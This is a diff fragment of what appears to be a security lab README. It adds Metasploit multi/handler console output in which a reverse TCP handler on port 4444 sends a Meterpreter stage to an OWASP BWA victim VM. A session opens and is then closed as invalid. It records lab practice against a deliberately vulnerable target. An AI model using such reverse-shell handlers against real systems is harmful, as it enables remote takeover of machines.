@@ -17,3 +17,16 @@ Metasploit: 5.0.89-dev
 Victim Machine: owaspbwa 2.6.32-25-generic-pae 
 Virtulization Product: VMWare Workstation 15
 
+Output:
+A=Attacker
+V=Victim
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.X.A:4444 
+[*] Sending stage (38288 bytes) to 192.168.X.V
+[*] Meterpreter session 1 opened (192.168.X.A:4444 -> 192.168.X.V:45365) at 2020-05-21 00:39:01 -0400
+
+[-] Meterpreter session 1 is not valid and will be closed
+[*] 192.168.X.V - Meterpreter session 1 closed.
+
